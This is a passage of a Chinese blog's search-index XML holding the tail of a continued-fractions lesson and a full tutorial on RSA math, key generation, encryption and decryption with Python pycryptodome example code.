和$\frac{p_{t+1}}{q_{t+1}}$是x的两个相邻的渐进分数，则<br>$\frac{p_t\:+\:r\:p_{t+1}}{q_t\:+\:r\:q_{t+1}}\quad(r\in\mathbb{Z},\:0\leq r\leq a_t)$,称作$x$的半渐进分数。</p><ul><li><p><strong>渐 进 分 数 也 是 半 渐 进 分 数</strong></p></li><li><p><strong>实数的最佳近似值只存在于半渐进分数里第t个和第t+2个渐进分数之间，大约有一半的“半渐进分数”是最佳近似值</strong></p></li><li><p><strong>$a^t$可以用来度量“逼近”的程度，表示渐进分数离实数究竟有多近。<br>$a^t$越大，渐进分数就更逼近实数。</strong></p></li></ul><h3 id="连分数的相反数"><a href="#连分数的相反数" class="headerlink" title="连分数的相反数"></a>连分数的相反数</h3><p>简单连分数中，只有$a_0$可为非正整数(0,$\pm$)</p><h4 id="简单连分数表示负数"><a href="#简单连分数表示负数" class="headerlink" title="简单连分数表示负数"></a>简单连分数表示负数</h4><p><strong>给实数</strong></p><script type="math/tex; mode=display">x=-X-F(0<F<1)\\=(-X-1)+(1-F)\\=[a_0-X-1,a_1,...]</script><p>$1-F=[a_0,a_1,…]$</p><p><strong>给简单连分数</strong></p><p>$x=[a_0,a_1,a_2,…]$</p><p>$-x=[-a_0-1,1,a_1-1,a_2,…]$</p><blockquote><p>PS:<script type="math/tex">若中间出现0，[...,a_{t-1},a_t,0,a_{t+1},a_{t+2},...],则-x=[...,a_{t-1},a_t+a_{t+1},a_{t+2},...]</script></p><script type="math/tex; mode=display">若末尾出现0，[\ldots,a_{n-2},a_{n-1},0],则-x=[\ldots,a_{n-2}]</script></blockquote><h3 id="普通连分数-general-continued-fraction"><a href="#普通连分数-general-continued-fraction" class="headerlink" title="普通连分数(general continued fraction)"></a>普通连分数(general continued fraction)</h3><p>$a_0+\frac{b_1}{a_1+\frac{b_2}{a_2+\frac{b_3}{…}}}$<br>$b_i$是正整数</p><h3 id="连分数的应用"><a href="#连分数的应用" class="headerlink" title="连分数的应用"></a>连分数的应用</h3><p>天文历法，植物学上树叶在茎上的排列规律，音乐领域</p><p>密码学上，著名的<strong>RSA算法</strong></p><hr><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><p>★,°<em>:.☆(￣▽￣)/$:</em>.°★<em> 。<em>*爱来自😽C.A.T😸喵</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Crypto数学基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 数论 </tag>
            
            <tag> 筑基篇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码算法篇·RSA</title>
      <link href="/2023/10/28/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7RSA/"/>
      <url>/2023/10/28/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7RSA/</url>
      
        <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li><p><strong>互质</strong>：两个<strong>正整数</strong>只有<strong>一个公因数1</strong>时，则称其为互质。</p></li><li><p><strong>欧拉函数$\varphi(N)$</strong>:小于或等于$N$的正整数中与$N$互质的数的<strong>个数</strong></p><p><strong>若$p$为素数，则$\varphi(p)=p-1$ (因为每一个小于$p$的数都与$p$互质。)</strong></p><p>由此我们有在RSA中，$\varphi(N)=(p-1)(q-1)$</p></li><li><p><strong>乘法逆元</strong>：</p><p>在加法中，我们有$a+(-a)=0$,我们称其互为相反数。</p><p>在乘法中，我们有$a\cdot(1/a)=1$,我们称其互为倒数，但是其实我们可以用一个统一的称呼：逆元，即某种运算下的逆元素，我们会发现，元素和其逆元素进行运算之后总是一个定值</p><p>实际上在代数中，他们构成了一个群(不用深究),而我们进行要了解则是在模意义下的乘法逆元在模$p$意义下，指的是后续的所有运算都是在模$p$的条件下满足，例如$3\cdot4\neq1$但$(3\cdot4) mod\ 11=(1) mod\ 11$,对于这种式子我们称其为<strong>同余式</strong>，并且有专门的同余符号进行表示<script type="math/tex">3\cdot4\equiv1\quad(\mathrm{mod~}11)</script><br>所以参考上面乘法中的逆元运算规则，在模意义下则有</p><script type="math/tex; mode=display">a\cdot a^{-1}\equiv1\quad(\mathrm{mod~}p)</script><p>我们称$a$和$a^{-1}$互为在模$p$意义下的乘法逆元。例如上述中的 3 与 4 互为在模 11 下的乘法逆元。</p></li><li><p><strong>欧拉定理</strong>：<script type="math/tex">设a\in \mathbb{Z_n^{*}},则a^{\phi(n)}\equiv1\pmod n</script></p><p>$且k\mid \phi(n),其中k是a在模n下的阶$</p><p><strong>$a^{\phi(p)}\equiv 1\pmod p$</strong></p><p><strong>$a^{p-1}\equiv 1\pmod p$</strong></p><p>两边都乘a</p><p>得到$a^p\equiv a\pmod p$</p><p>即<strong>费马小定理</strong>$(对于任意素数p和整数a\in \mathbb{Z_p},都有a^p\equiv a\pmod p)$</p></li></ul><h2 id="生成公私钥"><a href="#生成公私钥" class="headerlink" title="生成公私钥"></a>生成公私钥</h2><ol><li><p>选取两个不同的大素数$p$和$q$ ,计算$N=p\cdot q$ 。</p></li><li><p>求欧拉函数值$\varphi(N)=\varphi(p)\varphi(q)=(p-1)(q-1)$。</p></li><li><p>选择一个小于$\varphi(N)$的整数$e$ ,并且满足$e$和$\varphi ( N) \textbf{互 质 , 求 得 }e$在模$\varphi(N)$意义下的乘法逆元$d$ ,有$ed\equiv1$ (mod $\varphi ( N) )$</p></li><li><p>销毁$p$和$q$ 。</p></li></ol><p><strong>此时有$(N,e)$为公钥，$(N,d)$为私钥。</strong></p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>首先需要将消息，以一个双方约定好的格式转化为一个小于$N$的整数$m$。如果消息太长，可以将消息分为几段，这也就是我们所说的块加密，后对于每一部分利用如下公式加密：<script type="math/tex">c=m^e\quad(\mathrm{mod~}N)</script><br>此时得到的$c$便是我们的密文。</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>加密时我们只用到了公钥$(N,e)$,同理解密时我们也只需用到私钥$(N,d)$。有</p><script type="math/tex; mode=display">m= c^d\quad(\mathrm{mod~}N)</script><p>此时得到的$m$便是我们的明文消息。</p><h2 id="正确性证明"><a href="#正确性证明" class="headerlink" title="正确性证明"></a>正确性证明</h2><p>转换为证明<br>$m\equiv c^d$<br>$\equiv(m^e)^d$<br>$\equiv m^{ed}$ (mod $N)$<br>又有 $ed\equiv1$ (mod $\varphi(N))$,即$ed=1+k\varphi(N)$。</p><ol><li>若$gcd(m,N)=1$,则$m^{ed}\equiv m^{ed- 1}\cdot m\equiv m^{k\varphi ( N) }\cdot m\equiv m$ (mod $N)$。原式得证。</li></ol><ol><li>若$gcd(m,N)\neq1$,则$m$为$p$或$q$的整数倍，设$m=hp$,有<script type="math/tex; mode=display">\begin{aligned}m^{ed}&\equiv m^{ed-1}\\&\equiv m^{k(p-1)(q-1)}\cdot m\\&\equiv(1+xq)\cdot m\\&\equiv m+xq\cdot hp\\&\equiv m\quad(\mathrm{mod~}N)\end{aligned}</script>其中<script type="math/tex; mode=display">m^{k(p-1)(q-1)}=(m^{k(p-1)})^{q-1}=1+xq</script>原式得证。</li></ol><ol><li><p>生成两个大素数P，Q。</p><p>这是一个很模糊的概念，我希望各位在学习中能够做到尽量严谨，很显然，这里定义的<code>大素数</code>到底多大才是大呢？</p><p>10算大吗？100算吗？10000算吗？葛立恒数算吗？</p><p>我们需要一个更加精确的说法，我们生成两个512位的素数（这里包括之后的内容中涉及到的<code>位</code>都是指二进制位而不是十进制），那么如何使用Python产生一个素数呢，如果不借助任何外力的情况，我们可以从1开始选择，2，3，4…直到某个数满足512位且为素数为止，但是既然我们都使用Python了，为何还要这样做呢？</p><p>让我们来使用Python强大的开源库<code>pycryptodome</code>，一般来说你只需要使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip3 install pycryptodome</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">python3 -m pip install pycryptodome</span><br></pre></td></tr></table></figure><p>便可以成功安装，然后在Python环境中执行以下代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto</span><br></pre></td></tr></table></figure><p>如果没有显示<code>ModuleNotFoundError：</code>等诸如此类的错误话，那么恭喜你成功的安装了本库。这里你可能会奇怪为什么安装使用<code>pycryptodome</code>，而引入时使用<code>Crypto</code>，这涉及到这的库和其他库的一些联系，有兴趣的可以自行去查找。</p><p>然后我们就可以生成素数了，我们引入库中的子包<code>Crypto.Util.number</code>，这个子包中包含了大量的数学工具，之后我们会经常用到这个子包。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p>执行上面的代码，你便可以得到两个512位的素数，这依赖于我们调用了包中的<code>getPrime</code>函数，它能够返回一个<code>n</code>位的素数，其中<code>n</code>是我们的传入参数。至此我们便完成了RSA的第一步。</p></li><li><p>$n=p⋅q, φ(n)=(p−1)(q−1)$</p><p>后续的过程便简单了很多，我们只需要在之前的基础上完成运算即可，添加下列代码并执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li><li><p>$选取与φ(n)互素的e，计算满足ed≡1(mod\ φ(n))$</p><p>这里我们要完成两个数学操作，一个是互素的判断，一个是求解e的乘法逆元。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span>, <span class="string">&quot;该e不满足互素条件&quot;</span></span><br><span class="line">d = inverse(e, phi)</span><br></pre></td></tr></table></figure><p>这里<code>GCD</code>函数能够求解最大公因数（Greatest Common Divisor），之前我们学习了互素的概念就是两个数的最大公因数为1，所以这里我们用断言表达式认定e一定是和phi互素的。为什么我们要选择<code>65537</code>作为<code>e</code>呢，实际上这并不是硬性规定，一些标准提供了一些e的参考值，65537在各类实现与标准中被广泛使用，但是这并不影响你可以将值改变为其他值进行后续的操作。<br>求d的过程中，我们使用了<strong><code>inverse</code>函数</strong>，该函数有两个参数<code>(a,p)</code>，作用便是<strong>求解<code>a</code>在模<code>p</code>意义下的乘法逆元</strong>，那么这里我们便是求解<code>e</code>在模<code>phi</code>下面的乘法逆元，结果为<code>d</code>。之前我们提到了逆元是互为逆元，所以你可以尝试下面的代码</p><p><code>print(inverse(d, phi) == e)</code></p><p>打印的结果将为<code>True</code>，从这里我们也可以看出在RSA中的关键点便是获取这个<code>phi</code>的值，因为得到的<code>phi</code>我们便可以求<code>e</code>或<code>d</code>的值，而这正是我们加解密的密钥参数。</p></li><li><p>$(n,e)$即为公钥，$(n,d)$即为私钥，此时我们便得到了一组RSA的公私钥，随后我们便可以开始用这组密钥来进行加解密操作。</p><p><strong>加密：</strong></p><p>假设我们要加密的消息为<code>Hello</code>，我们定义一个字符串进行存储</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><p>注意这里我们定义的是一个<code>bytes</code>类型字符串，它将每个字符用8位二进制进行存储，是字符串最原生的存储形式。你也可以直接定义<code>&#39;hello&#39;</code>，但在Python3中它是一个Unicode的字符串，需要进行编码操作才能转换为<code>bytes</code>类型进行后续的运算。</p><p>但我们在RSA中是数与数的运算，该如何将字符串参与操作呢？</p><p>我们使用包中的<code>bytes_to_long</code>函数，从函数名也可以猜出来，这个函数是将字符串转换为数字，运行下列代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p>此时，我们的消息已经被转换为一个字符串了。随后我们便可以对消息进行RSA加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>我们使用Python自带的<code>pow</code>函数进行幂运算，注意不要写成<code>m**e % n</code>，二者代表的意义相同，但是<code>pow</code>函数内置快速幂，可以快速得出结果，而<code>m**e % n</code>会将$m^e$的结果先计算出来再取模，$m^e$是一个非常大的数，这会消耗你计算机大量的运算和存储资源。</p><p>至此，我们便完成了加密过程，得到了RSA的密文C。</p><p><strong>解密：</strong></p><p>我们执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p>此时我们便完成了RSA的解密操作，随后你可以比较一下<code>msg</code>和<code>m</code>的值，他们会是一样的。</p></li></ol><ul><li><p>完整代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span>, <span class="string">&quot;该e不满足互素条件&quot;</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;公钥：(<span class="subst">&#123;e&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;私钥：(<span class="subst">&#123;d&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;消息：&#x27;</span>, m)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密文：&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;明文：&#x27;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> msg == m, <span class="string">&quot;解密失败&quot;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
